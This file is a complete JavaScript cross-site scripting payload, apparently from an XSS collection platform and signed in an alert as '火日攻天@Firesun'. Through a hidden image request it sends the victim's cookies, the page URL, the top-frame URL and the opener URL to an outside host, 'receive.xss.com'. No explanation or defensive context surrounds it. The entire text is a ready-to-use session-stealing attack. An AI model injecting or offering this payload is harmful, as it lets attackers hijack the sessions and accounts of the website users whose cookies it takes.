var website = "http://receive.xss.com/";
(function() {
    (new Image()).src = website + '/?keepsession=1&location=' + escape((function() {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&cookie=' + escape((function() {
        try {
            return document.cookie
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());
})();
alert("Powered by 火日攻天@Firesun");